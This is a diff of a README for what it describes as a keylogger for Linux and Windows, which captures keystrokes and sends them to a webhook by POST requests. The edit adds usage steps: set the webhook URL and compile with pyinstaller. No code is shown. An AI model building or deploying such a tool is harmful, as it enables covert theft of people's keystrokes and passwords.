@@ -5,6 +5,7 @@
 # working
 
 this is a simple keylogger that works both on linux and windows it capures keystroks and send it via post requests 
-# 
- change the webhookurl before use
+# useage 
+ change the webhookurl before use(important)
+ 
  compile the file with 'pyinstaller' for your desired os for better results (optional)
